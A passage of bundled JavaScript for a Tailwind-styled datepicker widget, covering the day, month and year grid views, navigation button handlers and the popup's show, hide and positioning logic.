      if (options.daysOfWeekHighlighted) {
        this.daysOfWeekHighlighted = options.daysOfWeekHighlighted;
      }
      if (options.todayHighlight !== void 0) {
        this.todayHighlight = options.todayHighlight;
      }
      if (options.weekStart !== void 0) {
        this.weekStart = options.weekStart;
        this.weekEnd = options.weekEnd;
        updateDOW = true;
      }
      if (options.locale) {
        var locale = this.locale = options.locale;
        this.dayNames = locale.daysMin;
        this.switchLabelFormat = locale.titleFormat;
        updateDOW = true;
      }
      if (options.beforeShowDay !== void 0) {
        this.beforeShow = typeof options.beforeShowDay === "function" ? options.beforeShowDay : void 0;
      }
      if (options.calendarWeeks !== void 0) {
        if (options.calendarWeeks && !this.calendarWeeks) {
          var weeksElem = parseHTML(calendarWeeksTemplate).firstChild;
          this.calendarWeeks = {
            element: weeksElem,
            dow: weeksElem.firstChild,
            weeks: weeksElem.lastChild
          };
          this.element.insertBefore(weeksElem, this.element.firstChild);
        } else if (this.calendarWeeks && !options.calendarWeeks) {
          this.element.removeChild(this.calendarWeeks.element);
          this.calendarWeeks = null;
        }
      }
      if (options.showDaysOfWeek !== void 0) {
        if (options.showDaysOfWeek) {
          showElement(this.dow);
          if (this.calendarWeeks) {
            showElement(this.calendarWeeks.dow);
          }
        } else {
          hideElement(this.dow);
          if (this.calendarWeeks) {
            hideElement(this.calendarWeeks.dow);
          }
        }
      }
      if (updateDOW) {
        Array.from(this.dow.children).forEach(function(el, index) {
          var dow = (_this.weekStart + index) % 7;
          el.textContent = _this.dayNames[dow];
          el.className = _this.daysOfWeekDisabled.includes(dow) ? "dow disabled text-center h-6 leading-6 text-sm font-medium text-gray-500 dark:text-gray-400 cursor-not-allowed" : "dow text-center h-6 leading-6 text-sm font-medium text-gray-500 dark:text-gray-400";
        });
      }
    }
    // Apply update on the focused date to view's settings
  }, {
    key: "updateFocus",
    value: function updateFocus() {
      var viewDate = new Date(this.picker.viewDate);
      var viewYear = viewDate.getFullYear();
      var viewMonth = viewDate.getMonth();
      var firstOfMonth = dateValue(viewYear, viewMonth, 1);
      var start2 = dayOfTheWeekOf(firstOfMonth, this.weekStart, this.weekStart);
      this.first = firstOfMonth;
      this.last = dateValue(viewYear, viewMonth + 1, 0);
      this.start = start2;
      this.focused = this.picker.viewDate;
    }
    // Apply update on the selected dates to view's settings
  }, {
    key: "updateSelection",
    value: function updateSelection() {
      var _this$picker$datepick = this.picker.datepicker, dates = _this$picker$datepick.dates, rangepicker = _this$picker$datepick.rangepicker;
      this.selected = dates;
      if (rangepicker) {
        this.range = rangepicker.dates;
      }
    }
    // Update the entire view UI
  }, {
    key: "render",
    value: function render2() {
      var _this2 = this;
      this.today = this.todayHighlight ? today() : void 0;
      this.disabled = _toConsumableArray(this.datesDisabled);
      var switchLabel = formatDate(this.focused, this.switchLabelFormat, this.locale);
      this.picker.setViewSwitchLabel(switchLabel);
      this.picker.setPrevBtnDisabled(this.first <= this.minDate);
      this.picker.setNextBtnDisabled(this.last >= this.maxDate);
      if (this.calendarWeeks) {
        var startOfWeek = dayOfTheWeekOf(this.first, 1, 1);
        Array.from(this.calendarWeeks.weeks.children).forEach(function(el, index) {
          el.textContent = getWeek(addWeeks(startOfWeek, index));
        });
      }
      Array.from(this.grid.children).forEach(function(el, index) {
        var classList = el.classList;
        var current = addDays(_this2.start, index);
        var date2 = new Date(current);
        var day = date2.getDay();
        el.className = "datepicker-cell hover:bg-gray-100 dark:hover:bg-gray-600 block flex-1 leading-9 border-0 rounded-lg cursor-pointer text-center text-gray-900 dark:text-white font-semibold text-sm ".concat(_this2.cellClass);
        el.dataset.date = current;
        el.textContent = date2.getDate();
        if (current < _this2.first) {
          classList.add("prev", "text-gray-500", "dark:text-white");
        } else if (current > _this2.last) {
          classList.add("next", "text-gray-500", "dark:text-white");
        }
        if (_this2.today === current) {
          classList.add("today", "bg-gray-100", "dark:bg-gray-600");
        }
        if (current < _this2.minDate || current > _this2.maxDate || _this2.disabled.includes(current)) {
          classList.add("disabled", "cursor-not-allowed", "text-gray-400", "dark:text-gray-500");
          classList.remove("hover:bg-gray-100", "dark:hover:bg-gray-600", "text-gray-900", "dark:text-white", "cursor-pointer");
        }
        if (_this2.daysOfWeekDisabled.includes(day)) {
          classList.add("disabled", "cursor-not-allowed", "text-gray-400", "dark:text-gray-500");
          classList.remove("hover:bg-gray-100", "dark:hover:bg-gray-600", "text-gray-900", "dark:text-white", "cursor-pointer");
          pushUnique(_this2.disabled, current);
        }
        if (_this2.daysOfWeekHighlighted.includes(day)) {
          classList.add("highlighted");
        }
        if (_this2.range) {
          var _this2$range = _slicedToArray(_this2.range, 2), rangeStart = _this2$range[0], rangeEnd = _this2$range[1];
          if (current > rangeStart && current < rangeEnd) {
            classList.add("range", "bg-gray-200", "dark:bg-gray-600");
            classList.remove("rounded-lg", "rounded-l-lg", "rounded-r-lg");
          }
          if (current === rangeStart) {
            classList.add("range-start", "bg-gray-100", "dark:bg-gray-600", "rounded-l-lg");
            classList.remove("rounded-lg", "rounded-r-lg");
          }
          if (current === rangeEnd) {
            classList.add("range-end", "bg-gray-100", "dark:bg-gray-600", "rounded-r-lg");
            classList.remove("rounded-lg", "rounded-l-lg");
          }
        }
        if (_this2.selected.includes(current)) {
          classList.add("selected", "bg-blue-700", "!bg-primary-700", "text-white", "dark:bg-blue-600", "dark:!bg-primary-600", "dark:text-white");
          classList.remove("text-gray-900", "text-gray-500", "hover:bg-gray-100", "dark:text-white", "dark:hover:bg-gray-600", "dark:bg-gray-600", "bg-gray-100", "bg-gray-200");
        }
        if (current === _this2.focused) {
          classList.add("focused");
        }
        if (_this2.beforeShow) {
          _this2.performBeforeHook(el, current, current);
        }
      });
    }
    // Update the view UI by applying the changes of selected and focused items
  }, {
    key: "refresh",
    value: function refresh() {
      var _this3 = this;
      var _ref = this.range || [], _ref2 = _slicedToArray(_ref, 2), rangeStart = _ref2[0], rangeEnd = _ref2[1];
      this.grid.querySelectorAll(".range, .range-start, .range-end, .selected, .focused").forEach(function(el) {
        el.classList.remove("range", "range-start", "range-end", "selected", "bg-blue-700", "!bg-primary-700", "text-white", "dark:bg-blue-600", "dark:!bg-primary-600", "dark:text-white", "focused");
        el.classList.add("text-gray-900", "rounded-lg", "dark:text-white");
      });
      Array.from(this.grid.children).forEach(function(el) {
        var current = Number(el.dataset.date);
        var classList = el.classList;
        classList.remove("bg-gray-200", "dark:bg-gray-600", "rounded-l-lg", "rounded-r-lg");
        if (current > rangeStart && current < rangeEnd) {
          classList.add("range", "bg-gray-200", "dark:bg-gray-600");
          classList.remove("rounded-lg");
        }
        if (current === rangeStart) {
          classList.add("range-start", "bg-gray-200", "dark:bg-gray-600", "rounded-l-lg");
          classList.remove("rounded-lg");
        }
        if (current === rangeEnd) {
          classList.add("range-end", "bg-gray-200", "dark:bg-gray-600", "rounded-r-lg");
          classList.remove("rounded-lg");
        }
        if (_this3.selected.includes(current)) {
          classList.add("selected", "bg-blue-700", "!bg-primary-700", "text-white", "dark:bg-blue-600", "dark:!bg-primary-600", "dark:text-white");
          classList.remove("text-gray-900", "hover:bg-gray-100", "dark:text-white", "dark:hover:bg-gray-600", "bg-gray-100", "bg-gray-200", "dark:bg-gray-600");
        }
        if (current === _this3.focused) {
          classList.add("focused");
        }
      });
    }
    // Update the view UI by applying the change of focused item
  }, {
    key: "refreshFocus",
    value: function refreshFocus() {
      var index = Math.round((this.focused - this.start) / 864e5);
      this.grid.querySelectorAll(".focused").forEach(function(el) {
        el.classList.remove("focused");
      });
      this.grid.children[index].classList.add("focused");
    }
  }]);
}(View);
function computeMonthRange(range2, thisYear) {
  if (!range2 || !range2[0] || !range2[1]) {
    return;
  }
  var _range = _slicedToArray(range2, 2), _range$ = _slicedToArray(_range[0], 2), startY = _range$[0], startM = _range$[1], _range$2 = _slicedToArray(_range[1], 2), endY = _range$2[0], endM = _range$2[1];
  if (startY > thisYear || endY < thisYear) {
    return;
  }
  return [startY === thisYear ? startM : -1, endY === thisYear ? endM : 12];
}
var MonthsView = /* @__PURE__ */ function(_View) {
  function MonthsView2(picker) {
    _classCallCheck$1(this, MonthsView2);
    return _callSuper(this, MonthsView2, [picker, {
      id: 1,
      name: "months",
      cellClass: "month"
    }]);
  }
  _inherits$1(MonthsView2, _View);
  return _createClass$1(MonthsView2, [{
    key: "init",
    value: function init2(options) {
      var onConstruction = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : true;
      if (onConstruction) {
        this.grid = this.element;
        this.element.classList.add("months", "datepicker-grid", "w-64", "grid", "grid-cols-4");
        this.grid.appendChild(parseHTML(createTagRepeat("span", 12, {
          "data-month": function dataMonth(ix) {
            return ix;
          }
        })));
      }
      _get(_getPrototypeOf$1(MonthsView2.prototype), "init", this).call(this, options);
    }
  }, {
    key: "setOptions",
    value: function setOptions(options) {
      if (options.locale) {
        this.monthNames = options.locale.monthsShort;
      }
      if (hasProperty(options, "minDate")) {
        if (options.minDate === void 0) {
          this.minYear = this.minMonth = this.minDate = void 0;
        } else {
          var minDateObj = new Date(options.minDate);
          this.minYear = minDateObj.getFullYear();
          this.minMonth = minDateObj.getMonth();
          this.minDate = minDateObj.setDate(1);
        }
      }
      if (hasProperty(options, "maxDate")) {
        if (options.maxDate === void 0) {
          this.maxYear = this.maxMonth = this.maxDate = void 0;
        } else {
          var maxDateObj = new Date(options.maxDate);
          this.maxYear = maxDateObj.getFullYear();
          this.maxMonth = maxDateObj.getMonth();
          this.maxDate = dateValue(this.maxYear, this.maxMonth + 1, 0);
        }
      }
      if (options.beforeShowMonth !== void 0) {
        this.beforeShow = typeof options.beforeShowMonth === "function" ? options.beforeShowMonth : void 0;
      }
    }
    // Update view's settings to reflect the viewDate set on the picker
  }, {
    key: "updateFocus",
    value: function updateFocus() {
      var viewDate = new Date(this.picker.viewDate);
      this.year = viewDate.getFullYear();
      this.focused = viewDate.getMonth();
    }
    // Update view's settings to reflect the selected dates
  }, {
    key: "updateSelection",
    value: function updateSelection() {
      var _this$picker$datepick = this.picker.datepicker, dates = _this$picker$datepick.dates, rangepicker = _this$picker$datepick.rangepicker;
      this.selected = dates.reduce(function(selected, timeValue) {
        var date2 = new Date(timeValue);
        var year = date2.getFullYear();
        var month = date2.getMonth();
        if (selected[year] === void 0) {
          selected[year] = [month];
        } else {
          pushUnique(selected[year], month);
        }
        return selected;
      }, {});
      if (rangepicker && rangepicker.dates) {
        this.range = rangepicker.dates.map(function(timeValue) {
          var date2 = new Date(timeValue);
          return isNaN(date2) ? void 0 : [date2.getFullYear(), date2.getMonth()];
        });
      }
    }
    // Update the entire view UI
  }, {
    key: "render",
    value: function render2() {
      var _this = this;
      this.disabled = [];
      this.picker.setViewSwitchLabel(this.year);
      this.picker.setPrevBtnDisabled(this.year <= this.minYear);
      this.picker.setNextBtnDisabled(this.year >= this.maxYear);
      var selected = this.selected[this.year] || [];
      var yrOutOfRange = this.year < this.minYear || this.year > this.maxYear;
      var isMinYear = this.year === this.minYear;
      var isMaxYear = this.year === this.maxYear;
      var range2 = computeMonthRange(this.range, this.year);
      Array.from(this.grid.children).forEach(function(el, index) {
        var classList = el.classList;
        var date2 = dateValue(_this.year, index, 1);
        el.className = "datepicker-cell hover:bg-gray-100 dark:hover:bg-gray-600 block flex-1 leading-9 border-0 rounded-lg cursor-pointer text-center text-gray-900 dark:text-white font-semibold text-sm ".concat(_this.cellClass);
        if (_this.isMinView) {
          el.dataset.date = date2;
        }
        el.textContent = _this.monthNames[index];
        if (yrOutOfRange || isMinYear && index < _this.minMonth || isMaxYear && index > _this.maxMonth) {
          classList.add("disabled");
        }
        if (range2) {
          var _range2 = _slicedToArray(range2, 2), rangeStart = _range2[0], rangeEnd = _range2[1];
          if (index > rangeStart && index < rangeEnd) {
            classList.add("range");
          }
          if (index === rangeStart) {
            classList.add("range-start");
          }
          if (index === rangeEnd) {
            classList.add("range-end");
          }
        }
        if (selected.includes(index)) {
          classList.add("selected", "bg-blue-700", "!bg-primary-700", "text-white", "dark:bg-blue-600", "dark:!bg-primary-600", "dark:text-white");
          classList.remove("text-gray-900", "hover:bg-gray-100", "dark:text-white", "dark:hover:bg-gray-600");
        }
        if (index === _this.focused) {
          classList.add("focused");
        }
        if (_this.beforeShow) {
          _this.performBeforeHook(el, index, date2);
        }
      });
    }
    // Update the view UI by applying the changes of selected and focused items
  }, {
    key: "refresh",
    value: function refresh() {
      var _this2 = this;
      var selected = this.selected[this.year] || [];
      var _ref = computeMonthRange(this.range, this.year) || [], _ref2 = _slicedToArray(_ref, 2), rangeStart = _ref2[0], rangeEnd = _ref2[1];
      this.grid.querySelectorAll(".range, .range-start, .range-end, .selected, .focused").forEach(function(el) {
        el.classList.remove("range", "range-start", "range-end", "selected", "bg-blue-700", "!bg-primary-700", "dark:bg-blue-600", "dark:!bg-primary-700", "dark:text-white", "text-white", "focused");
        el.classList.add("text-gray-900", "hover:bg-gray-100", "dark:text-white", "dark:hover:bg-gray-600");
      });
      Array.from(this.grid.children).forEach(function(el, index) {
        var classList = el.classList;
        if (index > rangeStart && index < rangeEnd) {
          classList.add("range");
        }
        if (index === rangeStart) {
          classList.add("range-start");
        }
        if (index === rangeEnd) {
          classList.add("range-end");
        }
        if (selected.includes(index)) {
          classList.add("selected", "bg-blue-700", "!bg-primary-700", "text-white", "dark:bg-blue-600", "dark:!bg-primary-600", "dark:text-white");
          classList.remove("text-gray-900", "hover:bg-gray-100", "dark:text-white", "dark:hover:bg-gray-600");
        }
        if (index === _this2.focused) {
          classList.add("focused");
        }
      });
    }
    // Update the view UI by applying the change of focused item
  }, {
    key: "refreshFocus",
    value: function refreshFocus() {
      this.grid.querySelectorAll(".focused").forEach(function(el) {
        el.classList.remove("focused");
      });
      this.grid.children[this.focused].classList.add("focused");
    }
  }]);
}(View);
function toTitleCase(word) {
  return _toConsumableArray(word).reduce(function(str, ch, ix) {
    return str += ix ? ch : ch.toUpperCase();
  }, "");
}
var YearsView = /* @__PURE__ */ function(_View) {
  function YearsView2(picker, config) {
    _classCallCheck$1(this, YearsView2);
    return _callSuper(this, YearsView2, [picker, config]);
  }
  _inherits$1(YearsView2, _View);
  return _createClass$1(YearsView2, [{
    key: "init",
    value: function init2(options) {
      var onConstruction = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : true;
      if (onConstruction) {
        this.navStep = this.step * 10;
        this.beforeShowOption = "beforeShow".concat(toTitleCase(this.cellClass));
        this.grid = this.element;
        this.element.classList.add(this.name, "datepicker-grid", "w-64", "grid", "grid-cols-4");
        this.grid.appendChild(parseHTML(createTagRepeat("span", 12)));
      }
      _get(_getPrototypeOf$1(YearsView2.prototype), "init", this).call(this, options);
    }
  }, {
    key: "setOptions",
    value: function setOptions(options) {
      if (hasProperty(options, "minDate")) {
        if (options.minDate === void 0) {
          this.minYear = this.minDate = void 0;
        } else {
          this.minYear = startOfYearPeriod(options.minDate, this.step);
          this.minDate = dateValue(this.minYear, 0, 1);
        }
      }
      if (hasProperty(options, "maxDate")) {
        if (options.maxDate === void 0) {
          this.maxYear = this.maxDate = void 0;
        } else {
          this.maxYear = startOfYearPeriod(options.maxDate, this.step);
          this.maxDate = dateValue(this.maxYear, 11, 31);
        }
      }
      if (options[this.beforeShowOption] !== void 0) {
        var beforeShow = options[this.beforeShowOption];
        this.beforeShow = typeof beforeShow === "function" ? beforeShow : void 0;
      }
    }
    // Update view's settings to reflect the viewDate set on the picker
  }, {
    key: "updateFocus",
    value: function updateFocus() {
      var viewDate = new Date(this.picker.viewDate);
      var first = startOfYearPeriod(viewDate, this.navStep);
      var last = first + 9 * this.step;
      this.first = first;
      this.last = last;
      this.start = first - this.step;
      this.focused = startOfYearPeriod(viewDate, this.step);
    }
    // Update view's settings to reflect the selected dates
  }, {
    key: "updateSelection",
    value: function updateSelection() {
      var _this = this;
      var _this$picker$datepick = this.picker.datepicker, dates = _this$picker$datepick.dates, rangepicker = _this$picker$datepick.rangepicker;
      this.selected = dates.reduce(function(years, timeValue) {
        return pushUnique(years, startOfYearPeriod(timeValue, _this.step));
      }, []);
      if (rangepicker && rangepicker.dates) {
        this.range = rangepicker.dates.map(function(timeValue) {
          if (timeValue !== void 0) {
            return startOfYearPeriod(timeValue, _this.step);
          }
        });
      }
    }
    // Update the entire view UI
  }, {
    key: "render",
    value: function render2() {
      var _this2 = this;
      this.disabled = [];
      this.picker.setViewSwitchLabel("".concat(this.first, "-").concat(this.last));
      this.picker.setPrevBtnDisabled(this.first <= this.minYear);
      this.picker.setNextBtnDisabled(this.last >= this.maxYear);
      Array.from(this.grid.children).forEach(function(el, index) {
        var classList = el.classList;
        var current = _this2.start + index * _this2.step;
        var date2 = dateValue(current, 0, 1);
        el.className = "datepicker-cell hover:bg-gray-100 dark:hover:bg-gray-600 block flex-1 leading-9 border-0 rounded-lg cursor-pointer text-center text-gray-900 dark:text-white font-semibold text-sm ".concat(_this2.cellClass);
        if (_this2.isMinView) {
          el.dataset.date = date2;
        }
        el.textContent = el.dataset.year = current;
        if (index === 0) {
          classList.add("prev");
        } else if (index === 11) {
          classList.add("next");
        }
        if (current < _this2.minYear || current > _this2.maxYear) {
          classList.add("disabled");
        }
        if (_this2.range) {
          var _this2$range = _slicedToArray(_this2.range, 2), rangeStart = _this2$range[0], rangeEnd = _this2$range[1];
          if (current > rangeStart && current < rangeEnd) {
            classList.add("range");
          }
          if (current === rangeStart) {
            classList.add("range-start");
          }
          if (current === rangeEnd) {
            classList.add("range-end");
          }
        }
        if (_this2.selected.includes(current)) {
          classList.add("selected", "bg-blue-700", "!bg-primary-700", "text-white", "dark:bg-blue-600", "dark:!bg-primary-600", "dark:text-white");
          classList.remove("text-gray-900", "hover:bg-gray-100", "dark:text-white", "dark:hover:bg-gray-600");
        }
        if (current === _this2.focused) {
          classList.add("focused");
        }
        if (_this2.beforeShow) {
          _this2.performBeforeHook(el, current, date2);
        }
      });
    }
    // Update the view UI by applying the changes of selected and focused items
  }, {
    key: "refresh",
    value: function refresh() {
      var _this3 = this;
      var _ref = this.range || [], _ref2 = _slicedToArray(_ref, 2), rangeStart = _ref2[0], rangeEnd = _ref2[1];
      this.grid.querySelectorAll(".range, .range-start, .range-end, .selected, .focused").forEach(function(el) {
        el.classList.remove("range", "range-start", "range-end", "selected", "bg-blue-700", "!bg-primary-700", "text-white", "dark:bg-blue-600", "dark!bg-primary-600", "dark:text-white", "focused");
      });
      Array.from(this.grid.children).forEach(function(el) {
        var current = Number(el.textContent);
        var classList = el.classList;
        if (current > rangeStart && current < rangeEnd) {
          classList.add("range");
        }
        if (current === rangeStart) {
          classList.add("range-start");
        }
        if (current === rangeEnd) {
          classList.add("range-end");
        }
        if (_this3.selected.includes(current)) {
          classList.add("selected", "bg-blue-700", "!bg-primary-700", "text-white", "dark:bg-blue-600", "dark:!bg-primary-600", "dark:text-white");
          classList.remove("text-gray-900", "hover:bg-gray-100", "dark:text-white", "dark:hover:bg-gray-600");
        }
        if (current === _this3.focused) {
          classList.add("focused");
        }
      });
    }
    // Update the view UI by applying the change of focused item
  }, {
    key: "refreshFocus",
    value: function refreshFocus() {
      var index = Math.round((this.focused - this.start) / this.step);
      this.grid.querySelectorAll(".focused").forEach(function(el) {
        el.classList.remove("focused");
      });
      this.grid.children[index].classList.add("focused");
    }
  }]);
}(View);
function triggerDatepickerEvent(datepicker, type) {
  var detail2 = {
    date: datepicker.getDate(),
    viewDate: new Date(datepicker.picker.viewDate),
    viewId: datepicker.picker.currentView.id,
    datepicker
  };
  datepicker.element.dispatchEvent(new CustomEvent(type, {
    detail: detail2
  }));
}
function goToPrevOrNext(datepicker, direction) {
  var _datepicker$config = datepicker.config, minDate = _datepicker$config.minDate, maxDate = _datepicker$config.maxDate;
  var _datepicker$picker = datepicker.picker, currentView = _datepicker$picker.currentView, viewDate = _datepicker$picker.viewDate;
  var newViewDate;
  switch (currentView.id) {
    case 0:
      newViewDate = addMonths(viewDate, direction);
      break;
    case 1:
      newViewDate = addYears(viewDate, direction);
      break;
    default:
      newViewDate = addYears(viewDate, direction * currentView.navStep);
  }
  newViewDate = limitToRange(newViewDate, minDate, maxDate);
  datepicker.picker.changeFocus(newViewDate).render();
}
function switchView(datepicker) {
  var viewId = datepicker.picker.currentView.id;
  if (viewId === datepicker.config.maxView) {
    return;
  }
  datepicker.picker.changeView(viewId + 1).render();
}
function unfocus(datepicker) {
  if (datepicker.config.updateOnBlur) {
    datepicker.update({
      autohide: true
    });
  } else {
    datepicker.refresh("input");
    datepicker.hide();
  }
}
function goToSelectedMonthOrYear(datepicker, selection) {
  var picker = datepicker.picker;
  var viewDate = new Date(picker.viewDate);
  var viewId = picker.currentView.id;
  var newDate = viewId === 1 ? addMonths(viewDate, selection - viewDate.getMonth()) : addYears(viewDate, selection - viewDate.getFullYear());
  picker.changeFocus(newDate).changeView(viewId - 1).render();
}
function onClickTodayBtn(datepicker) {
  var picker = datepicker.picker;
  var currentDate = today();
  if (datepicker.config.todayBtnMode === 1) {
    if (datepicker.config.autohide) {
      datepicker.setDate(currentDate);
      return;
    }
    datepicker.setDate(currentDate, {
      render: false
    });
    picker.update();
  }
  if (picker.viewDate !== currentDate) {
    picker.changeFocus(currentDate);
  }
  picker.changeView(0).render();
}
function onClickClearBtn(datepicker) {
  datepicker.setDate({
    clear: true
  });
}
function onClickViewSwitch(datepicker) {
  switchView(datepicker);
}
function onClickPrevBtn(datepicker) {
  goToPrevOrNext(datepicker, -1);
}
function onClickNextBtn(datepicker) {
  goToPrevOrNext(datepicker, 1);
}
function onClickView(datepicker, ev) {
  var target = findElementInEventPath(ev, ".datepicker-cell");
  if (!target || target.classList.contains("disabled")) {
    return;
  }
  var _datepicker$picker$cu = datepicker.picker.currentView, id = _datepicker$picker$cu.id, isMinView = _datepicker$picker$cu.isMinView;
  if (isMinView) {
    datepicker.setDate(Number(target.dataset.date));
  } else if (id === 1) {
    goToSelectedMonthOrYear(datepicker, Number(target.dataset.month));
  } else {
    goToSelectedMonthOrYear(datepicker, Number(target.dataset.year));
  }
}
function onClickPicker(datepicker) {
  if (!datepicker.inline && !datepicker.config.disableTouchKeyboard) {
    datepicker.inputField.focus();
  }
}
function processPickerOptions(picker, options) {
  if (options.title !== void 0) {
    if (options.title) {
      picker.controls.title.textContent = options.title;
      showElement(picker.controls.title);
    } else {
      picker.controls.title.textContent = "";
      hideElement(picker.controls.title);
    }
  }
  if (options.prevArrow) {
    var prevBtn = picker.controls.prevBtn;
    emptyChildNodes(prevBtn);
    options.prevArrow.forEach(function(node) {
      prevBtn.appendChild(node.cloneNode(true));
    });
  }
  if (options.nextArrow) {
    var nextBtn = picker.controls.nextBtn;
    emptyChildNodes(nextBtn);
    options.nextArrow.forEach(function(node) {
      nextBtn.appendChild(node.cloneNode(true));
    });
  }
  if (options.locale) {
    picker.controls.todayBtn.textContent = options.locale.today;
    picker.controls.clearBtn.textContent = options.locale.clear;
  }
  if (options.todayBtn !== void 0) {
    if (options.todayBtn) {
      showElement(picker.controls.todayBtn);
    } else {
      hideElement(picker.controls.todayBtn);
    }
  }
  if (hasProperty(options, "minDate") || hasProperty(options, "maxDate")) {
    var _picker$datepicker$co = picker.datepicker.config, minDate = _picker$datepicker$co.minDate, maxDate = _picker$datepicker$co.maxDate;
    picker.controls.todayBtn.disabled = !isInRange(today(), minDate, maxDate);
  }
  if (options.clearBtn !== void 0) {
    if (options.clearBtn) {
      showElement(picker.controls.clearBtn);
    } else {
      hideElement(picker.controls.clearBtn);
    }
  }
}
function computeResetViewDate(datepicker) {
  var dates = datepicker.dates, config = datepicker.config;
  var viewDate = dates.length > 0 ? lastItemOf(dates) : config.defaultViewDate;
  return limitToRange(viewDate, config.minDate, config.maxDate);
}
function setViewDate(picker, newDate) {
  var oldViewDate = new Date(picker.viewDate);
  var newViewDate = new Date(newDate);
  var _picker$currentView = picker.currentView, id = _picker$currentView.id, year = _picker$currentView.year, first = _picker$currentView.first, last = _picker$currentView.last;
  var viewYear = newViewDate.getFullYear();
  picker.viewDate = newDate;
  if (viewYear !== oldViewDate.getFullYear()) {
    triggerDatepickerEvent(picker.datepicker, "changeYear");
  }
  if (newViewDate.getMonth() !== oldViewDate.getMonth()) {
    triggerDatepickerEvent(picker.datepicker, "changeMonth");
  }
  switch (id) {
    case 0:
      return newDate < first || newDate > last;
    case 1:
      return viewYear !== year;
    default:
      return viewYear < first || viewYear > last;
  }
}
function getTextDirection(el) {
  return window.getComputedStyle(el).direction;
}
var Picker = /* @__PURE__ */ function() {
  function Picker2(datepicker) {
    _classCallCheck$1(this, Picker2);
    this.datepicker = datepicker;
    var template = pickerTemplate.replace(/%buttonClass%/g, datepicker.config.buttonClass);
    var element = this.element = parseHTML(template).firstChild;
    var _element$firstChild$c = _slicedToArray(element.firstChild.children, 3), header = _element$firstChild$c[0], main2 = _element$firstChild$c[1], footer = _element$firstChild$c[2];
    var title = header.firstElementChild;
    var _header$lastElementCh = _slicedToArray(header.lastElementChild.children, 3), prevBtn = _header$lastElementCh[0], viewSwitch = _header$lastElementCh[1], nextBtn = _header$lastElementCh[2];
    var _footer$firstChild$ch = _slicedToArray(footer.firstChild.children, 2), todayBtn = _footer$firstChild$ch[0], clearBtn = _footer$firstChild$ch[1];
    var controls = {
      title,
      prevBtn,
      viewSwitch,
      nextBtn,
      todayBtn,
      clearBtn
    };
    this.main = main2;
    this.controls = controls;
    var elementClass = datepicker.inline ? "inline" : "dropdown";
    element.classList.add("datepicker-".concat(elementClass));
    elementClass === "dropdown" ? element.classList.add("dropdown", "absolute", "top-0", "left-0", "z-50", "pt-2") : null;
    processPickerOptions(this, datepicker.config);
    this.viewDate = computeResetViewDate(datepicker);
    registerListeners(datepicker, [[element, "click", onClickPicker.bind(null, datepicker), {
      capture: true
    }], [main2, "click", onClickView.bind(null, datepicker)], [controls.viewSwitch, "click", onClickViewSwitch.bind(null, datepicker)], [controls.prevBtn, "click", onClickPrevBtn.bind(null, datepicker)], [controls.nextBtn, "click", onClickNextBtn.bind(null, datepicker)], [controls.todayBtn, "click", onClickTodayBtn.bind(null, datepicker)], [controls.clearBtn, "click", onClickClearBtn.bind(null, datepicker)]]);
    this.views = [new DaysView(this), new MonthsView(this), new YearsView(this, {
      id: 2,
      name: "years",
      cellClass: "year",
      step: 1
    }), new YearsView(this, {
      id: 3,
      name: "decades",
      cellClass: "decade",
      step: 10
    })];
    this.currentView = this.views[datepicker.config.startView];
    this.currentView.render();
    this.main.appendChild(this.currentView.element);
    datepicker.config.container.appendChild(this.element);
  }
  return _createClass$1(Picker2, [{
    key: "setOptions",
    value: function setOptions(options) {
      processPickerOptions(this, options);
      this.views.forEach(function(view) {
        view.init(options, false);
      });
      this.currentView.render();
    }
  }, {
    key: "detach",
    value: function detach() {
      this.datepicker.config.container.removeChild(this.element);
    }
  }, {
    key: "show",
    value: function show2() {
      if (this.active) {
        return;
      }
      this.element.classList.add("active", "block");
      this.element.classList.remove("hidden");
      this.active = true;
      var datepicker = this.datepicker;
      if (!datepicker.inline) {
        var inputDirection = getTextDirection(datepicker.inputField);
        if (inputDirection !== getTextDirection(datepicker.config.container)) {
          this.element.dir = inputDirection;
        } else if (this.element.dir) {
          this.element.removeAttribute("dir");
        }
        this.place();
        if (datepicker.config.disableTouchKeyboard) {
          datepicker.inputField.blur();
        }
      }
      triggerDatepickerEvent(datepicker, "show");
    }
  }, {
    key: "hide",
    value: function hide2() {
      if (!this.active) {
        return;
      }
      this.datepicker.exitEditMode();
      this.element.classList.remove("active", "block");
      this.element.classList.add("active", "block", "hidden");
      this.active = false;
      triggerDatepickerEvent(this.datepicker, "hide");
    }
  }, {
    key: "place",
    value: function place() {
      var _this$element = this.element, classList = _this$element.classList, style = _this$element.style;
      var _this$datepicker = this.datepicker, config = _this$datepicker.config, inputField = _this$datepicker.inputField;
      var container = config.container;
      var _this$element$getBoun = this.element.getBoundingClientRect(), calendarWidth = _this$element$getBoun.width, calendarHeight = _this$element$getBoun.height;
      var _container$getBoundin = container.getBoundingClientRect(), containerLeft = _container$getBoundin.left, containerTop = _container$getBoundin.top, containerWidth = _container$getBoundin.width;
      var _inputField$getBoundi = inputField.getBoundingClientRect(), inputLeft = _inputField$getBoundi.left, inputTop = _inputField$getBoundi.top, inputWidth = _inputField$getBoundi.width, inputHeight = _inputField$getBoundi.height;
      var _config$orientation = config.orientation, orientX = _config$orientation.x, orientY = _config$orientation.y;
      var scrollTop;
      var left2;
      var top2;
      if (container === document.body) {
        scrollTop = window.scrollY;
        left2 = inputLeft + window.scrollX;
        top2 = inputTop + scrollTop;
      } else {
        scrollTop = container.scrollTop;
        left2 = inputLeft - containerLeft;
        top2 = inputTop - containerTop + scrollTop;
      }
      if (orientX === "auto") {
        if (left2 < 0) {
          orientX = "left";
          left2 = 10;
        } else if (left2 + calendarWidth > containerWidth) {
          orientX = "right";
        } else {
          orientX = getTextDirection(inputField) === "rtl" ? "right" : "left";
        }
      }
      if (orientX === "right") {
        left2 -= calendarWidth - inputWidth;
      }
      if (orientY === "auto") {
        orientY = top2 - calendarHeight < scrollTop ? "bottom" : "top";
      }
      if (orientY === "top") {
        top2 -= calendarHeight;
      } else {
        top2 += inputHeight;
      }
      classList.remove("datepicker-orient-top", "datepicker-orient-bottom", "datepicker-orient-right", "datepicker-orient-left");
      classList.add("datepicker-orient-".concat(orientY), "datepicker-orient-".concat(orientX));
      style.top = top2 ? "".concat(top2, "px") : top2;
      style.left = left2 ? "".concat(left2, "px") : left2;
    }
  }, {
    key: "setViewSwitchLabel",
    value: function setViewSwitchLabel(labelText) {
      this.controls.viewSwitch.textContent = labelText;
    }
  }, {
    key: "setPrevBtnDisabled",
    value: function setPrevBtnDisabled(disabled) {
      this.controls.prevBtn.disabled = disabled;
    }
  }, {
    key: "setNextBtnDisabled",
